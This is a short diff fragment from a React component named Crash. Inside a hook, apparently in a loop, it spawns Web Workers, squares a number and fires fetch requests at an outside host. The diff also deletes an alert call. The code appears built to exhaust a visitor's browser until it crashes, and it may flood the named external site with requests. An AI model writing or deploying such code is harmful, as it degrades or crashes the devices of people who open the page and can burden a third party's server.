@@ -14,7 +14,6 @@ export default function Crash() {
       new Worker("worker.js");
       a = a ** 2;
       fetch("https://liff-tool.f5.si");
-      alert(a);
     }
   }, []);
   return (
